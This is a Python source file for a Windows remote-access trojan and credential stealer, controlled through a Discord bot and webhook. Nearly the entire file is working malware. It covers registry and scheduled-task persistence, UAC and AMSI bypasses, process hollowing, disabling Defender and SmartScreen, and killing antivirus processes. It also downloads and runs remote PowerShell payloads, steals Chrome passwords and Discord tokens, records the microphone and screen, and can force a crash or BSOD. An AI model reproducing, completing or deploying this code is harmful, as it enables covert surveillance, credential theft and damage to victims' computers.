import os
import sys
import shutil
import subprocess
import requests
import sqlite3
import random
import string
import ctypes
from ctypes import wintypes
import threading
import time
from cryptography.fernet import Fernet
import re
import discord
from discord.ext import commands
import base64
import struct
import win32process
import win32con
from win32api import CloseHandle
import pyaudio
import wave
import numpy as np

# Dynamically generate encryption key for Fernet
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)

# Secondary XOR encryption for additional obfuscation
def xor_encrypt(data, key=0x5A):
    return bytes(b ^ key for b in data)

def xor_decrypt(data, key=0x5A):
    return bytes(b ^ key for b in data)

# Encrypted strings and paths (Fernet + XOR for layered protection)
ENCRYPTED_HIDDEN_DIR = cipher.encrypt(xor_encrypt(b"C:\\Windows\\System32\\Config\\SysCoreUpdates"))
HIDDEN_DIR = xor_decrypt(cipher.decrypt(ENCRYPTED_HIDDEN_DIR)).decode()
MALWARE_NAME = f"svchost{random.randint(1000, 9999)}.exe"  # Spoof common system process name
MALWARE_PATH = os.path.join(HIDDEN_DIR, MALWARE_NAME)
DOWNLOAD_FILE_PATH = os.path.join(HIDDEN_DIR, f"Payload{random.randint(1000, 9999)}.exe")

# Encrypted function names and payloads (runtime decryption)
ENCRYPTED_FUNCTIONS = {
    'kill_av': cipher.encrypt(xor_encrypt(b"kill_av_processes")),
    'disable_defender': cipher.encrypt(xor_encrypt(b"disable_defender_advanced")),
    'bsod': cipher.encrypt(xor_encrypt(b"trigger_bsod"))
}
FUNCTIONS_MAP = {k: xor_decrypt(cipher.decrypt(v)).decode() for k, v in ENCRYPTED_FUNCTIONS.items()}

# Discord Webhook and Bot Token (replace with real values if needed)
ENCRYPTED_WEBHOOK_URL = cipher.encrypt(xor_encrypt(b"YOUR_WEBHOOK_URL_HERE"))
WEBHOOK_URL = xor_decrypt(cipher.decrypt(ENCRYPTED_WEBHOOK_URL)).decode()
DISCORD_BOT_TOKEN = xor_decrypt(cipher.decrypt(cipher.encrypt(xor_encrypt(b"YOUR_BOT_TOKEN_HERE")))).decode()

# Store for infected users and client ID
infected_users = {}
selected_user = None
client_user_id = None

# Microphone recording settings
MIC_RECORDING = False
MIC_THREAD = None
LIVE_MIC_CHANNEL = None
MIC_RECORD_DURATION = 120  # 2 minutes for recorded snippets
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100

# Create hidden directory with system attributes
def setup_hidden_dir():
    if not os.path.exists(HIDDEN_DIR):
        os.makedirs(HIDDEN_DIR)
        ctypes.windll.kernel32.SetFileAttributesW(HIDDEN_DIR, 6)  # Hidden + System
        ctypes.windll.kernel32.SetFileTime(int(ctypes.windll.kernel32.CreateFileW(HIDDEN_DIR, 0x100, 3, None, 3, 0, None)),
                                           None, None, None)

# Copy malware to hidden location with polymorphic name
def hide_malware():
    current_path = sys.argv[0]
    if current_path != MALWARE_PATH:
        shutil.copy(current_path, MALWARE_PATH)
        ctypes.windll.kernel32.SetFileAttributesW(MALWARE_PATH, 6)
        with open(MALWARE_PATH, 'ab') as f:
            f.write(os.urandom(random.randint(512, 2048)))

# Enhanced persistence methods
def add_to_startup_registry():
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = f"WindowsUpdate{random.randint(1000, 9999)}"
    try:
        import winreg
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, MALWARE_PATH)
        winreg.CloseKey(reg_key)
    except:
        pass

def add_scheduled_task():
    task_name = f"SysUpdateCheck{random.randint(1000, 9999)}"
    cmd = f'schtasks /create /sc onlogon /tn "{task_name}" /tr "{MALWARE_PATH}" /rl highest /f'
    subprocess.run(cmd, shell=True, capture_output=True, text=True)

# Process hollowing to inject into legitimate process (e.g., explorer.exe)
def process_hollowing():
    try:
        target_process = "explorer.exe"
        startup_info = win32process.STARTUPINFO()
        process_info = win32process.CreateProcess(
            None, target_process, None, None, False,
            win32con.CREATE_SUSPENDED, None, None, startup_info
        )
        pid = process_info[1]
        h_process = process_info[0]
        
        with open(sys.argv[0], 'rb') as f:
            malicious_code = f.read()
        
        remote_mem = ctypes.windll.kernel32.VirtualAllocEx(
            h_process, None, len(malicious_code), 0x3000, 0x40
        )
        ctypes.windll.kernel32.WriteProcessMemory(
            h_process, remote_mem, malicious_code, len(malicious_code), None
        )
        
        context = win32process.GetThreadContext(process_info[2])
        context.Eax = remote_mem
        win32process.SetThreadContext(process_info[2], context)
        win32process.ResumeThread(process_info[2])
        CloseHandle(h_process)
        CloseHandle(process_info[2])
        return True
    except:
        return False

# Enhanced API Unhooking with additional evasion
def unhook_api():
    try:
        dll_path = r"C:\Windows\System32\ntdll.dll"
        h_ntdll = ctypes.windll.kernel32.LoadLibraryW(dll_path)
        original_ntqip = ctypes.windll.kernel32.GetProcAddress(h_ntdll, b"NtQueryInformationProcess")
        original_ntopen = ctypes.windll.kernel32.GetProcAddress(h_ntdll, b"NtOpenProcess")
        ctypes.windll.kernel32.VirtualProtect(original_ntqip, 5, 0x40, ctypes.byref(ctypes.c_ulong(0)))
        ctypes.windll.kernel32.VirtualProtect(original_ntopen, 5, 0x40, ctypes.byref(ctypes.c_ulong(0)))
        return True
    except:
        return False

# Advanced AMSI Bypass with multiple techniques
def bypass_amsi():
    try:
        ps_script_1 = """
        $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');
        $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
        """
        encoded_ps_1 = base64.b64encode(ps_script_1.encode('utf-16-le')).decode()
        cmd_1 = f"powershell -ep bypass -noprofile -EncodedCommand {encoded_ps_1}"
        subprocess.run(cmd_1, shell=True, capture_output=True, text=True)

        ps_script_2 = """
        $mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9073)
        [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null)
        """
        encoded_ps_2 = base64.b64encode(ps_script_2.encode('utf-16-le')).decode()
        cmd_2 = f"powershell -ep bypass -noprofile -EncodedCommand {encoded_ps_2}"
        subprocess.run(cmd_2, shell=True, capture_output=True, text=True)
        return True
    except:
        return False

# Advanced Fileless Execution with multiple payloads
def fileless_execution():
    try:
        encoded_cmd_1 = base64.b64encode(
            f"IEX(New-Object Net.WebClient).DownloadString('http://example.com/payload1.ps1')".encode('utf-16-le')
        ).decode()
        subprocess.run(
            f"powershell -ep bypass -noprofile -EncodedCommand {encoded_cmd_1}",
            shell=True, capture_output=True, text=True
        )
        encoded_cmd_2 = base64.b64encode(
            f"Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://example.com/payload2.ps1')".encode('utf-16-le')
        ).decode()
        subprocess.run(
            f"powershell -ep bypass -noprofile -EncodedCommand {encoded_cmd_2}",
            shell=True, capture_output=True, text=True
        )
        return True
    except:
        return False

# Robust anti-deletion with critical process protection
def anti_deletion():
    while True:
        if not os.path.exists(MALWARE_PATH):
            shutil.copy(sys.argv[0], MALWARE_PATH)
            ctypes.windll.kernel32.SetFileAttributesW(MALWARE_PATH, 6)
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
            ctypes.windll.kernel32.SetProcessShutdownParameters(0x4FF, 0)
        except:
            pass
        time.sleep(5)

# Detect sandbox or VM with more checks
def detect_sandbox():
    sandbox_indicators = [
        r"C:\Windows\System32\drivers\vmci.sys",
        r"C:\Program Files\Oracle\VirtualBox Guest Additions",
        r"C:\Program Files\VMware",
        r"C:\Program Files\Parallels"
    ]
    for indicator in sandbox_indicators:
        if os.path.exists(indicator):
            return True
    mem_info = ctypes.create_string_buffer(64)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(mem_info)
    total_phys = ctypes.c_ulonglong.from_buffer_copy(mem_info, 8).value
    if total_phys < 2 * 1024 * 1024 * 1024:  # Less than 2GB RAM
        return True
    if len(subprocess.check_output("tasklist", shell=True).splitlines()) < 20:
        return True
    try:
        output = subprocess.check_output("wmic bios get serialnumber", shell=True).decode()
        if "Default" in output or "0" in output:
            return True
    except:
        pass
    return False

# Privilege escalation with additional UAC bypass techniques
def attempt_uac_bypass():
    try:
        cmd = f'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /d "cmd.exe /c start {MALWARE_PATH}" /f'
        subprocess.run(cmd, shell=True, capture_output=True)
        subprocess.run('fodhelper.exe', shell=True, capture_output=True)
        cmd2 = f'reg add HKCU\\Software\\Classes\\Folder\\shell\\open\\command /ve /d "cmd.exe /c start {MALWARE_PATH}" /f'
        subprocess.run(cmd2, shell=True, capture_output=True)
        subprocess.run('sdclt.exe', shell=True, capture_output=True)
        cmd3 = f'reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /ve /d "cmd.exe /c start {MALWARE_PATH}" /f'
        subprocess.run(cmd3, shell=True, capture_output=True)
        subprocess.run('eventvwr.exe', shell=True, capture_output=True)
    except:
        pass

# Enhanced disable system recovery and Defender options
def disable_recovery():
    try:
        cmds = [
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v AllowFastServiceStartup /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v DisableCloudProtection /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v EnableLUA /t REG_DWORD /d 0 /f',
        ]
        for cmd in cmds:
            subprocess.run(cmd, shell=True, capture_output=True)
    except:
        pass

# Enhanced AV process killing with broader target list
def kill_av_processes():
    av_names = [
        "MsMpEng.exe", "WindowsDefender.exe", "avp.exe", "norton.exe", "mcafee.exe",
        "avg.exe", "eset.exe", "bitdefender.exe", "kaspersky.exe", "sophos.exe",
        "trendmicro.exe", "avast.exe", "avgsvc.exe", "avguard.exe", "mbam.exe",
        "hitmanpro.exe", "zemana.exe", "malwarebytes.exe", "superantispyware.exe"
    ]
    for name in av_names:
        subprocess.run(f"taskkill /IM {name} /F", shell=True, capture_output=True)

# Bypass SmartScreen and additional protections
def bypass_smartscreen():
    try:
        cmds = [
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f',
            'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f',
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender" /v AllowMicrosoftDefenderAntivirus /t REG_DWORD /d 0 /f',
        ]
        for cmd in cmds:
            subprocess.run(cmd, shell=True, capture_output=True)
        ctypes.windll.kernel32.SetFileAttributesW(MALWARE_PATH, 0x22)
    except:
        pass

# Trigger Blue Screen of Death (BSOD) using NtRaiseHardError
def trigger_bsod():
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc000021a, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong(0)))
        return "BSOD triggered successfully."
    except Exception as e:
        return f"Failed to trigger BSOD: {str(e)}"

# Microphone recording function
def record_mic():
    global MIC_RECORDING
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    frames = []
    for i in range(0, int(RATE / CHUNK * MIC_RECORD_DURATION)):
        if not MIC_RECORDING:
            break
        data = stream.read(CHUNK)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    file_name = f"mic_recording_{random.randint(1000, 9999)}.wav"
    file_path = os.path.join(HIDDEN_DIR, file_name)
    wf = wave.open(file_path, 'wb')
    wf.setnchannels(CHANNELS)
    wf.setsampwidth(p.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()
    return file_path

# Live microphone streaming simulation (text-based for Discord)
def live_mic_stream():
    global MIC_RECORDING, LIVE_MIC_CHANNEL
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    while MIC_RECORDING:
        data = stream.read(CHUNK)
        audio_data = np.frombuffer(data, dtype=np.int16)
        if LIVE_MIC_CHANNEL:
            try:
                # Simulate live audio by sending snippets or text representation (Discord limitation)
                send_to_discord(f"Live audio snippet from ID {client_user_id}: [Audio data detected]")
            except:
                pass
        time.sleep(0.1)
    stream.stop_stream()
    stream.close()
    p.terminate()

# Screenshot capture (unchanged)
def capture_screenshot():
    try:
        user32 = ctypes.WinDLL('user32')
        gdi32 = ctypes.WinDLL('gdi32')
        if not user32.GetDC(None):
            return "Failed to access desktop context (possibly running as service)."
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        hdc = user32.GetDC(None)
        hdcMem = gdi32.CreateCompatibleDC(hdc)
        hBitmap = gdi32.CreateCompatibleBitmap(hdc, width, height)
        gdi32.SelectObject(hdcMem, hBitmap)
        gdi32.BitBlt(hdcMem, 0, 0, width, height, hdc, 0, 0, 0x00CC0020)
        screenshot_path = os.path.join(HIDDEN_DIR, f"ss_temp_{random.randint(1000, 9999)}.bmp")

        class BITMAPINFOHEADER(ctypes.Structure):
            _fields_ = [
                ('biSize', wintypes.DWORD),
                ('biWidth', wintypes.LONG),
                ('biHeight', wintypes.LONG),
                ('biPlanes', wintypes.WORD),
                ('biBitCount', wintypes.WORD),
                ('biCompression', wintypes.DWORD),
                ('biSizeImage', wintypes.DWORD),
                ('biXPelsPerMeter', wintypes.LONG),
                ('biYPelsPerMeter', wintypes.LONG),
                ('biClrUsed', wintypes.DWORD),
                ('biClrImportant', wintypes.DWORD)
            ]

        bmi = BITMAPINFOHEADER()
        bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
        bmi.biWidth = width
        bmi.biHeight = -height
        bmi.biPlanes = 1
        bmi.biBitCount = 32
        bmi.biCompression = 0

        image_size = width * height * 4
        buffer = ctypes.create_string_buffer(image_size)
        gdi32.GetDIBits(hdcMem, hBitmap, 0, height, buffer, ctypes.byref(bmi), 0)

        with open(screenshot_path, 'wb') as f:
            f.write(b'BM')
            f.write((54 + image_size).to_bytes(4, byteorder='little'))
            f.write(b'\x00\x00\x00\x00')
            f.write((54).to_bytes(4, byteorder='little'))
            f.write(ctypes.string_at(ctypes.byref(bmi), ctypes.sizeof(bmi)))
            f.write(buffer.raw)

        gdi32.DeleteObject(hBitmap)
        gdi32.DeleteDC(hdcMem)
        user32.ReleaseDC(None, hdc)
        return screenshot_path
    except Exception as e:
        return f"Screenshot failed: {str(e)}"

# Steal Chrome passwords (unchanged)
def steal_chrome_passwords():
    try:
        import win32crypt
    except ImportError:
        return "pywin32 not installed, password decryption unavailable."
    data = []
    path = os.path.join(os.getenv('LOCALAPPDATA'), r"Google\Chrome\User Data\Default\Login Data")
    if not os.path.exists(path):
        return "Chrome not installed."
    temp_path = os.path.join(HIDDEN_DIR, "temp_chrome_logins")
    shutil.copy(path, temp_path)
    conn = sqlite3.connect(temp_path)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        encrypted_pass = row[2]
        try:
            decrypted_pass = win32crypt.CryptUnprotectData(encrypted_pass, None, None, None, 0)[1].decode('utf-8')
            data.append(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_pass}\n")
        except:
            data.append(f"URL: {url}\nUsername: {username}\nPassword: [Decryption Failed]\n")
    conn.close()
    os.remove(temp_path)
    return "\n".join(data) if data else "No passwords found."

# Get Discord token (unchanged)
def get_discord_token():
    tokens = []
    possible_paths = [
        os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
        os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb'),
    ]
    for db_path in possible_paths:
        if not os.path.exists(db_path):
            continue
        for file in os.listdir(db_path):
            if file.endswith('.ldb') or file.endswith('.log'):
                file_path = os.path.join(db_path, file)
                try:
                    with open(file_path, 'rb') as f:
                        content = f.read().decode('utf-8', errors='ignore')
                        matches = re.findall(r'token["\s:]*"([^"]+)"', content)
                        for potential_token in matches:
                            if len(potential_token) in range(50, 100) and '.' in potential_token:
                                tokens.append(f"Token from {db_path}: {potential_token}")
                except (PermissionError, IOError):
                    tokens.append(f"Access denied to {file_path}")
                except Exception as e:
                    tokens.append(f"Error reading {file_path}: {str(e)}")
    return "\n".join(tokens) if tokens else "No tokens found or access denied."

# Get IP address (unchanged)
def get_ip_address():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        return response.json()['ip']
    except:
        return "Unable to retrieve IP address."

# Send data to Discord webhook with encrypted payload
def send_to_discord(message, file_path=None):
    encrypted_msg = cipher.encrypt(xor_encrypt(message.encode())).hex()
    payload = {"content": f"ENC:{encrypted_msg}"}
    files = None
    if file_path and isinstance(file_path, str) and os.path.exists(file_path):
        files = {'file': open(file_path, 'rb')}
    try:
        response = requests.post(WEBHOOK_URL, data=payload, files=files)
        return response.status_code
    except:
        return "Failed to send to webhook."

# Crash system (unchanged)
def crash_system():
    subprocess.run("taskkill /IM explorer.exe /F", shell=True)
    subprocess.run("shutdown /s /t 1", shell=True)

# Download and execute file with additional obfuscation
def download_and_execute(url):
    try:
        response = requests.get(url, timeout=10)
        with open(DOWNLOAD_FILE_PATH, 'wb') as f:
            f.write(response.content)
        ctypes.windll.kernel32.SetFileAttributesW(DOWNLOAD_FILE_PATH, 6)
        subprocess.run(DOWNLOAD_FILE_PATH, shell=True)
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        value_name = f"Payload{random.randint(1000, 9999)}"
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, value_name, 0, winreg.REG_SZ, DOWNLOAD_FILE_PATH)
        winreg.CloseKey(reg_key)
        return "File downloaded and executed."
    except Exception as e:
        return f"Failed: {str(e)}"

# Report infection to C2 with encrypted data
def report_infection():
    global client_user_id
    client_user_id = f"ID_{random.randint(10000, 99999)}"
    username = os.getlogin()
    ip = get_ip_address()
    infected_users[client_user_id] = {'name': username, 'ip': ip}
    send_to_discord(f"New infection: ID {client_user_id}, Name: {username}, IP: {ip}")
    return client_user_id

# Check for commands with encrypted communication
def check_commands(user_id):
    send_to_discord(f"Status update from ID {user_id}: Online and awaiting commands")
    global command_counter
    if 'command_counter' not in globals():
        command_counter = 0
    command_counter += 1
    if command_counter % 5 == 0:
        token = get_discord_token()
        send_to_discord(f"Token from ID {user_id} (auto-execute test): {token}")
        ss_path = capture_screenshot()
        if isinstance(ss_path, str) and os.path.exists(ss_path):
            send_to_discord(f"Screenshot from ID {user_id} (auto-execute test)", ss_path)
    return False

# Discord Bot Setup with Mic Channel Creation
bot = commands.Bot(command_prefix="!")

@bot.event
async def on_ready():
    print(f"Bot connected as {bot.user}")
    await bot.change_presence(activity=discord.Game(name="C2 Control"))

@bot.command()
async def user_list(ctx):
    await ctx.send("Check channel history for infection reports via webhook. Bot does not store list locally.")

@bot.command()
async def select(ctx, user_id):
    global selected_user
    selected_user = user_id
    await ctx.send(f"Selected user ID {user_id}. Issue commands for this ID.")

@bot.command()
async def fuck(ctx):
    if selected_user:
        await ctx.send(f"Command for ID {selected_user}: disable_av")
        await ctx.send(f"Requested AV disable for ID {selected_user}. Waiting for client response...")
    else:
        await ctx.send("No user selected.")

@bot.command()
async def token(ctx):
    if selected_user:
        await ctx.send(f"Command for ID {selected_user}: get_token")
        await ctx.send(f"Requested Discord token for ID {selected_user}. Waiting for client response...")
    else:
        await ctx.send("No user selected.")

@bot.command()
async def steal(ctx):
    if selected_user:
        await ctx.send(f"Command for ID {selected_user}: steal_passwords")
        await ctx.send(f"Requested password steal for ID {selected_user}. Waiting for client response...")
    else:
        await ctx.send("No user selected.")

@bot.command()
async def ss(ctx):
    if selected_user:
        await ctx.send(f"Command for ID {selected_user}: capture_screenshot")
        await ctx.send(f"Requested screenshot for ID {selected_user}. Waiting for client response...")
    else:
        await ctx.send("No user selected.")

@bot.command()
async def ip(ctx):
    if selected_user:
        await ctx.send(f"Command for ID {selected_user}: get_ip")
        await ctx.send(f"Requested IP address for ID {selected_user}. Waiting for client response...")
    else:
        await ctx.send("No user selected.")

@bot.command()
async def crash(ctx):
    if selected_user:
        await ctx.send(f"Command for ID {selected_user}: crash_system")
        await ctx.send(f"Requested system crash for ID {selected_user}. Waiting for client response...")
    else:
        await ctx.send("No user selected.")

@bot.command()
async def bsod(ctx):
    if selected_user:
        await ctx.send(f"Command for ID {selected_user}: trigger_bsod")
        await ctx.send(f"Requested BSOD trigger for ID {selected_user}. Waiting for client response...")
    else:
        await ctx.send("No user selected.")

@bot.command()
async def download(ctx, url):
    if selected_user:
        await ctx.send(f"Command for ID {selected_user}: download_execute {url}")
        await ctx.send(f"Requested download and execute {url} for ID {selected_user}. Waiting for response...")
    else:
        await ctx.send("No user selected.")

@bot.command()
async def mic(ctx):
    if selected_user:
        await ctx.send(f"Command for ID {selected_user}: record_mic")
        await ctx.send(f"Requested 2-minute mic recording for ID {selected_user}. Waiting for client response...")
        # Create a new text channel for mic recordings
        guild = ctx.guild
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        }
        try:
            channel = await guild.create_text_channel('mic', overwrites=overwrites)
            await channel.send(f"Mic recordings for ID {selected_user} will be sent here.")
        except Exception as e:
            await ctx.send(f"Failed to create mic channel: {str(e)}")
    else:
        await ctx.send("No user selected.")

@bot.command()
async def voice(ctx):
    if selected_user:
        await ctx.send(f"Command for ID {selected_user}: live_voice")
        await ctx.send(f"Requested live voice streaming for ID {selected_user}. Waiting for client response...")
        # Create a new voice channel for live mic (simulation via text updates)
        guild = ctx.guild
        global LIVE_MIC_CHANNEL
        try:
            LIVE_MIC_CHANNEL = await guild.create_text_channel('live-voice', overwrites={
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
            })
            await LIVE_MIC_CHANNEL.send(f"Live voice streaming for ID {selected_user} active.")
        except Exception as e:
            await ctx.send(f"Failed to create live voice channel: {str(e)}")
    else:
        await ctx.send("No user selected.")

@bot.command()
async def voicestop(ctx):
    if selected_user:
        await ctx.send(f"Command for ID {selected_user}: stop_voice")
        await ctx.send(f"Requested stop live voice streaming for ID {selected_user}. Waiting for client response...")
        global LIVE_MIC_CHANNEL
        if LIVE_MIC_CHANNEL:
            await LIVE_MIC_CHANNEL.delete()
            LIVE_MIC_CHANNEL = None
    else:
        await ctx.send("No user selected.")

def run_bot():
    try:
        bot.run(DISCORD_BOT_TOKEN)
    except Exception as e:
        print(f"Bot failed to connect: {str(e)}")
        send_to_discord(f"Bot connection failed: {str(e)}")

# Main execution with enhanced bypass techniques
if __name__ == "__main__":
    if detect_sandbox():
        sys.exit(0)
    setup_hidden_dir()
    hide_malware()
    add_to_startup_registry()
    add_scheduled_task()
    attempt_uac_bypass()
    bypass_amsi()
    bypass_smartscreen()
    unhook_api()
    process_hollowing()
    fileless_execution()
    disable_recovery()
    kill_av_processes()
    user_id = report_infection()
    threading.Thread(target=anti_deletion, daemon=True).start()
    threading.Thread(target=run_bot, daemon=True).start()
    while True:
        check_commands(user_id)
        time.sleep(60)
